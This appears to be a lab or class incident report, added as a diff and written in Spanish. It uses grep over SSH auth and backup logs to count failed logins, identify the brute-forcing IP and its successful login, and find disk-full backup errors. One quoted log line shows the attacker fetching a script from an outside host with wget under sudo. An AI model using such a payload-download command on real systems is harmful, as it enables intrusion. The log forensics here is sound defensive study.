@@ -1,0 +1,32 @@
+INFORME FIN DE SEMANA - Grupo bitacora-4
+
+P1: Intentos fallidos de autenticación
+cmd: grep 'Failed password' auth.log | wc -l
+120
+
+P2: Top de IPs atacantes
+cmd: grep 'Failed password' auth.log | grep -oE 'from [0-9.]+' | cut -d' ' -f2 | sort | uniq -c | sort -rn | head
+     80 203.0.113.42
+     20 198.51.100.7
+     20 192.0.2.15
+
+P3: Acceso logrado y permanencia del atacante
+cmd: grep 'Accepted password' auth.log
+Aug 24 09:18:05 srv1 sshd[945]: Accepted password for sysadmin from 192.168.100.100 port 52985 ssh2
+Aug 26 09:12:05 srv1 sshd[968]: Accepted password for sysadmin from 192.168.100.100 port 52547 ssh2
+Aug 28 09:10:05 srv1 sshd[973]: Accepted password for sysadmin from 192.168.100.100 port 52550 ssh2
+Aug 29 03:07:44 srv1 sshd[1399]: Accepted password for sysadmin from 203.0.113.42 port 44123 ssh2
+cmd: grep -E 'session (opened|closed)' auth.log
+Aug 29 03:07:44 srv1 sshd[1399]: pam_unix(sshd:session): session opened for user sysadmin
+Aug 29 03:29:02 srv1 sshd[1399]: pam_unix(sshd:session): session closed for user sysadmin
+
+Bonus P3: Comando ejecutado y fecha del archivo sospechoso
+cmd: grep -i 'COMMAND' auth.log
+Aug 29 03:12:19 srv1 sudo[1402]:    sysadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.42/x.sh
+cmd: ls -l --time-style=full-iso /tmp/x.sh
+-rw-r--r-- 1 root root 16 2026-08-29 03:12:30.000000000 -0300 /tmp/x.sh
+
+P4: Fallas en la tarea nocturna de respaldo
+cmd: grep 'No space left' respaldo.log
+[2026-08-29 01:31:03] tar: /backup/diario.tar.gz: No space left on device
+[2026-08-30 01:31:07] tar: /backup/diario.tar.gz: No space left on device
